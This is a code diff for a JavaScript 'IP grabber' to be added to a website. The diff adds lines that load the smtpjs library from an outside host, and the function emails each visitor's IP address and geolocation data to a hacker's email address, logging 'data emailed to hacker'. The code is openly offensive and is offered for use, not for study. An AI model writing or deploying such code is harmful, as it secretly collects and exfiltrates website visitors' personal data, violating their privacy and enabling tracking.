@@ -1,5 +1,11 @@
 // add this to you're website
 // javascript ip grabber
+
+// add smtpjs script to head of html doc.
+var smtpjs = document.createElement("script")
+smtpjs.setAttribute("src","https://smtpjs.com/v3/smtp.js" )
+document.head.appendChild(smtpjs)
+
 function ipGrabber() {    
    var ipAddr = "";
    var data = {}
@@ -18,7 +24,7 @@ function ipGrabber() {
         To : 'hackerEmail@mail.com',
         From : "hackerEmail@mail.com",
         Subject: ipAddr+ " geolocation data",
-        Body : data
+        Body : data.toString()
     }).then(
       console.log("data emailed to hacker");
     );
